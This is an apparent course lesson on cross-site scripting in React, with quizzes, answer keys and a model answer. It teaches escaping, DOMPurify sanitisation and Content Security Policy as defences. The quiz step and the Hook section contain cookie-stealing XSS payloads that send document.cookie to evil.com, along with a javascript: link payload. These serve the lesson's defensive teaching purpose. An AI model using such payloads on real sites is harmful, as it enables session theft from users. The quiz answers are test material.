---
id: fe-sen-m4-01
school: engineering
domainId: frontend-engineering
tier: SENIOR
moduleId: fe-sen-m4
moduleTitle: "Module 4: Security"
moduleGlyph: "🛡️"
moduleSortOrder: 4
topicSlug: xss
topicTitle: "XSS"
topicSortOrder: 1
lesson: xss
title: "Cross-Site Scripting (XSS)"
sortOrder: 1
difficulty: 4
estimatedMinutes: 35
xpReward: 120
practiceType: NONE
questType: SYNTHESIS
retrievalWeight: high
questTypes: [guided, solo, retrieval]
prerequisites: []
integrationDomains: [psychology, philosophy]
soloAssessment:
  type: PATTERN_MATCH
  rubricItems:
    - Correctly defines the three types of XSS (reflected, stored, DOM-based)
    - Explains how React prevents most XSS by default and why
    - Identifies dangerouslySetInnerHTML as the primary React XSS vector
    - Explains Content Security Policy (CSP) as a defence-in-depth mechanism
    - Synthesises a defensive approach for scenarios requiring HTML rendering
  keywords: [XSS, reflected, stored, DOM, dangerouslySetInnerHTML, escaping, sanitise, DOMPurify, CSP, Content-Security-Policy, script injection, trusted types]
  modelAnswer: |
    XSS (Cross-Site Scripting) allows attackers to inject malicious scripts into pages viewed by other users. Reflected XSS: malicious script in a URL parameter, reflected in the response. Stored XSS: malicious script saved to the database, served to all users. DOM-based XSS: client-side JavaScript writes untrusted data into the DOM without sanitisation.

    React prevents most XSS by escaping all values before rendering: `<p>{userInput}</p>` renders userInput as text, not HTML. React never evaluates user-provided strings as HTML. This makes React apps significantly harder to XSS than traditional server-rendered apps.

    The primary React XSS vector is dangerouslySetInnerHTML — its name is the warning. It bypasses React's escaping and injects raw HTML. The only safe use requires sanitising the HTML first with a library like DOMPurify: `dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userHtml) }}`.

    Content Security Policy (CSP) is defence-in-depth: a HTTP header that restricts which scripts can execute. Even if XSS occurs, CSP prevents the malicious script from: loading remote resources, sending data to attacker domains, or executing inline scripts (with script-src 'none'). CSP does not prevent XSS — it limits the damage.
guidedSteps:
  - type: MULTIPLE_CHOICE
    prompt: "A React component renders `<div dangerouslySetInnerHTML={{ __html: comment.body }} />` where comment.body is user-submitted. An attacker submits `<script>fetch('https://evil.com/?c='+document.cookie)</script>`. What happens?"
    options:
      - "React escapes the script tag — it's rendered as text"
      - "The script executes, sending the user's cookies to the attacker"
      - "The browser blocks script tags in innerHTML by default"
      - "React's XSS protection prevents the script from running"
    correctIndex: 1
    feedback: "dangerouslySetInnerHTML bypasses React's escaping and injects raw HTML. Unlike React's normal rendering, innerHTML does execute script tags in some browsers (though modern browsers have mitigated this specific vector via innerHTML). The deeper risk: img onerror attributes, svg onload events, and other event-based vectors still execute. Always sanitise with DOMPurify before using dangerouslySetInnerHTML."
  - type: SHORT_TEXT
    prompt: "You need to render user-submitted rich text (bold, italics, links — submitted as HTML). Describe a safe approach that allows HTML rendering while preventing XSS."
    hint: "Can you allow some HTML tags while blocking dangerous ones? What tool does this?"
  - type: FILL_BLANK
    prompt: "React prevents XSS by ___ all values rendered in JSX. dangerouslySetInnerHTML ___ this protection."
    answer: "escaping/encoding; bypasses"
    hint: "The name 'dangerously' is the clue — it deliberately removes the default protection."
microCheckpoint:
  - type: MULTIPLE_CHOICE
    question: "What does a Content Security Policy (CSP) header do?"
    options:
      - "Prevents all XSS attacks by blocking script injection"
      - "Restricts which sources scripts, styles, and resources can be loaded from — limiting XSS damage"
      - "Encrypts user data in transit"
      - "Validates form inputs on the server"
    correctIndex: 1
    feedback: "CSP doesn't prevent XSS injection — it limits what an injected script can do. A strict CSP (script-src 'self'; connect-src 'self') prevents injected scripts from loading external code or sending data to attacker domains. It's defence-in-depth — the last line of defence when other protections fail."
  - type: MULTIPLE_CHOICE
    question: "Which code is safe from XSS in React?"
    options:
      - "<div dangerouslySetInnerHTML={{ __html: userInput }} />"
      - "<p>{userInput}</p>"
      - "document.getElementById('div').innerHTML = userInput;"
      - "eval(userInput)"
    correctIndex: 1
    feedback: "React's JSX expression `{userInput}` always renders as text — the value is HTML-escaped. Tags and scripts become literal characters. The others directly inject raw HTML or execute code: dangerouslySetInnerHTML, innerHTML, and eval all bypass React's protection."
retrieval:
  recall: "Name the three types of XSS and describe how each one delivers the malicious script."
  explain: "Explain why React's normal JSX rendering is resistant to XSS and what breaks that protection."
  mistakeId:
    code: |
      // Rendering markdown from user input
      import marked from 'marked';
      
      function Comment({ content }) {
        return (
          <div dangerouslySetInnerHTML={{ __html: marked(content) }} />
        );
      }
    answer: "marked converts markdown to HTML but does not sanitise it. A user can submit `[click me](javascript:alert('xss'))` or include raw HTML in the markdown. The resulting HTML executes JavaScript. Fix: sanitise the marked output with DOMPurify before injection: `dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(marked(content)) }}`. Alternatively, use a markdown library that sanitises by default (like marked + DOMPurify, or react-markdown which renders to React components and avoids innerHTML entirely)."
---

# Hook

A user on your platform submits a comment: `<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">`. Every user who views that comment has their session cookie stolen. The attacker harvests hundreds of sessions.

This is a stored XSS attack. And if you're using dangerouslySetInnerHTML without sanitisation, it works perfectly.

# Lore Introduction

*"A warded city is not impenetrable — it is penetrated by those who know which words open which gates,"* the Security Mage explains. *"Cross-site scripting is the attacker's knowledge of your gate words. Their weapon is your own rendering engine, turned against your users."*

She draws a shield glyph. *"React closes most of the gates by default. Know which ones remain open."*

# Core Learning

## Concept Introduction

**XSS** allows attackers to inject scripts that execute in victims' browsers.

**Three types:**
| Type | How it works | Example |
|---|---|---|
| **Reflected** | Malicious input in URL, reflected in response | `?search=<script>...` |
| **Stored** | Malicious input saved to DB, served to all users | Comment: `<script>steal(cookie)</script>` |
| **DOM-based** | Client JS writes untrusted data to DOM | `innerHTML = location.hash` |

**React's built-in protection:**
```jsx
// SAFE — React escapes userInput as text
<p>{userInput}</p>
// If userInput = '<script>alert(1)</script>'
// Renders: &lt;script&gt;alert(1)&lt;/script&gt; (literal text)
```

React's template system converts `<` to `&lt;` and `>` to `&gt;` before DOM insertion. Scripts can't execute as text.

**The main risk: dangerouslySetInnerHTML:**
```jsx
// UNSAFE — bypasses React's protection
<div dangerouslySetInnerHTML={{ __html: userContent }} />

// SAFER — sanitise first
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userContent) }} />
```

**Other risky patterns:**
```jsx
// UNSAFE — javascript: URLs
<a href={userUrl}>Click</a>  // if userUrl = 'javascript:steal()'

// SAFE
<a href={userUrl.startsWith('http') ? userUrl : '#'}>Click</a>
```

## Why It Matters

XSS is the frontend's signature vulnerability — the one your role specifically owns — and it remains in the OWASP Top 10 after two decades because every new app rediscovers it:

- The blast radius is total: injected script runs with your page's full authority — reading session data, harvesting keystrokes on the login form, performing any action the user can, silently, on your domain with your padlock icon
- One leak is enough: a single `dangerouslySetInnerHTML`, one `innerHTML` concatenation, one unsanitised URL in an `href` can undo a framework's worth of automatic escaping — which is why audits grep for exactly these
- Frameworks protect the common path, not all paths: React escapes text content, but markdown renderers, rich-text editors, third-party embeds, and `javascript:` URLs all step outside that protection and back into your hands
- Defence is layered by design: output encoding as the rule, sanitisation (DOMPurify) where HTML is genuinely needed, and Content Security Policy as the net that catches what everything else missed — each layer assumes the others will someday fail

The uncomfortable truth that keeps this lesson relevant: XSS isn't exotic. It's a Tuesday-afternoon code review miss, found six months later by a researcher — or worse, not by a researcher.

## Common Mistakes

- **Using dangerouslySetInnerHTML with unsanitised input.** The name is the warning.
- **Trusting markdown libraries to be safe.** Most markdown-to-HTML converters don't sanitise — add DOMPurify.
- **Not validating `href` and `src` attributes.** `javascript:` URLs execute code when clicked.
- **Assuming React protects against everything.** React protects JSX expressions. Direct DOM manipulation (via refs, third-party libraries) bypasses it.

## Mental Model

React's JSX rendering is a write-only, sanitised channel. You can write anything; it comes out as text. `dangerouslySetInnerHTML` is a bypass valve — it opens a direct, unsanitised channel to the DOM. Treat every use of this bypass as a potential vulnerability until you can prove the content is sanitised.

## Mini Summary

- ✔ React escapes JSX expressions — `{userInput}` is always safe
- ✔ dangerouslySetInnerHTML bypasses escaping — always sanitise with DOMPurify first
- ✔ Validate href/src attributes — reject `javascript:` URLs
- ✔ CSP is defence-in-depth — restricts what injected scripts can do
- ✔ Stored XSS is the highest impact — user-generated content rendered as HTML

# Guided Practice Quest

Work through the guided steps to identify XSS vectors and describe sanitisation strategies.

# Solo Practice Quest

Your platform needs to support user-written blog posts with rich formatting (bold, italic, links, images — no scripts). The posts are submitted as HTML from a WYSIWYG editor. Design the security strategy: what do you sanitise, when, and how? What tags and attributes do you allow? What do you block? Should sanitisation happen on the client, server, or both?

# Integration

**Philosophy — The Confused Deputy Problem**

XSS is a classic instance of the Confused Deputy problem — a security concept formalised by Norm Hardy (1988). A confused deputy is a computer program that has authority it shouldn't use on behalf of someone who shouldn't have that authority. In XSS: the browser has authority to execute JavaScript. The attacker tricks the browser into executing attacker-controlled code using the victim's authority (their session, their permissions). The browser is the confused deputy — it can't distinguish between the site's legitimate JavaScript and the attacker's injected script. React's escaping is one mitigation: it prevents the attacker from speaking to the browser in JavaScript. CSP is another: it restricts the browser's authority to execute scripts to a trusted list. Both reduce the browser's ability to be confused.

# Lore Conclusion

*"The gates are ward-locked now,"* the Security Mage says, reviewing the sanitisation layer. *"Untrusted words pass through the escaping filter — they cannot be spoken as spells. Only sanctioned words, from sanctioned sources, carry power."*

---
